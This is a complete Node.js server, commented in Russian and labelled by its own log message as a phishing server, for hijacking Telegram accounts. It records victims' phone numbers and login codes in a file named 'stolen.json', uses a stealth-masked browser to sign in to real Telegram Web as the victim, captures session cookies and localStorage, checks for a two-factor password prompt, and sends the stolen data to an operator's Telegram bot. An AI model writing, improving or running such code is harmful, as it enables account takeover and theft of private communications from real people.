const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(cors());

// Логирование украденных данных
const logFile = path.join(__dirname, 'stolen.json');

// Состояния сессий
const sessions = new Map();

// Валидация через Puppeteer (реальный Telegram Web)
async function validateCredentials(phone, code) {
    const browser = await puppeteer.launch({
        headless: false, // Важно: показываем браузер для прохождения капчи
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--window-size=1280,720'
        ]
    });

    try {
        const page = await browser.newPage();
        
        // Маскируем WebDriver
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {get: () => false});
        });

        // Идём на Telegram Web
        await page.goto('https://web.telegram.org/k/', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        // Вводим телефон
        await page.waitForSelector('input[type="text"]', {timeout: 10000});
        await page.type('input[type="text"]', phone);
        
        // Жмём "Next"
        await page.click('button[type="submit"]');
        
        // Ждём поле для кода
        await page.waitForSelector('input[type="text"]', {timeout: 15000});
        
        // Вводим код
        await page.type('input[type="text"]', code);
        
        // Жмём "Sign In"
        await page.click('button[type="submit"]');
        
        // Проверяем, залогинились ли (ждём появления интерфейса чатов)
        try {
            await page.waitForSelector('.chat-list', {timeout: 10000});
            const cookies = await page.cookies();
            const localStorageData = await page.evaluate(() => {
                return JSON.stringify(localStorage);
            });
            
            return {
                success: true,
                cookies,
                localStorage: localStorageData
            };
        } catch (e) {
            // Возможно, запрашивает 2FA
            const hasPassword = await page.$('input[type="password"]');
            if (hasPassword) {
                return {
                    success: false,
                    needPassword: true,
                    message: 'Требуется облачный пароль'
                };
            }
            return {success: false, message: 'Неверные данные'};
        }
    } catch (error) {
        console.error('Puppeteer error:', error);
        return {success: false, error: error.message};
    } finally {
        await browser.close();
    }
}

// Эндпоинт для сбора данных
app.post('/api/login', async (req, res) => {
    const { phone, code, step, initData } = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const timestamp = Date.now();
    const sessionId = req.headers['x-session-id'] || `session_${timestamp}`;

    // Логируем все данные
    const logEntry = {
        timestamp,
        ip,
        sessionId,
        step,
        phone,
        code: code || null,
        initData: initData || null,
        userAgent: req.headers['user-agent']
    };

    // Сохраняем в файл
    let logs = [];
    try {
        if (fs.existsSync(logFile)) {
            logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }
    } catch (e) {}
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    if (step === 'phone') {
        // Сохраняем телефон в сессии
        sessions.set(sessionId, { phone, step: 'phone' });
        
        // Имитация отправки кода (реально мы не можем отправить код, ждём от жертвы)
        res.json({ 
            success: true, 
            message: 'Код отправлен',
            sessionId 
        });

    } else if (step === 'code') {
        // Получили и телефон, и код — пробуем залогиниться
        console.log(`[!] Пытаемся войти: ${phone} / ${code}`);
        
        // Валидируем через Puppeteer
        const validation = await validateCredentials(phone, code);
        
        if (validation.success) {
            console.log(`[+] Успешный вход: ${phone}`);
            
            // Сохраняем полные данные
            const fullLog = {
                ...logEntry,
                success: true,
                cookies: validation.cookies,
                localStorage: validation.localStorage,
                validatedAt: Date.now()
            };
            
            logs[logs.length - 1] = fullLog;
            fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
            
            // Отправляем в Telegram боту (опционально)
            await notifyTelegram(fullLog);
            
            res.json({ success: true });
        } else if (validation.needPassword) {
            res.json({ 
                success: false, 
                needPassword: true,
                message: 'Требуется облачный пароль'
            });
        } else {
            res.json({ 
                success: false, 
                message: 'Неверный код'
            });
        }
    }
});

// Эндпоинт для повторной отправки кода (просто логируем)
app.post('/api/resend', (req, res) => {
    const { phone } = req.body;
    console.log(`[i] Запрос повторного кода: ${phone}`);
    res.json({ success: true });
});

// Уведомление в Telegram-бот (опционально)
async function notifyTelegram(data) {
    const botToken = 'ВАШ_ТОКЕН_БОТА'; // Создай отдельного бота для уведомлений
    const chatId = 'ВАШ_CHAT_ID';
    
    const message = `
🔐 **НОВЫЙ ЛОГИН**
📱 Телефон: \`${data.phone}\`
🔑 Код: \`${data.code}\`
🌐 IP: ${data.ip}
🕐 Время: ${new Date(data.timestamp).toLocaleString()}
📦 InitData: ${data.initData?.substring(0, 100)}...
    `;
    
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {}
}

app.listen(3000, () => {
    console.log('🚀 Phishing server running on port 3000');
});
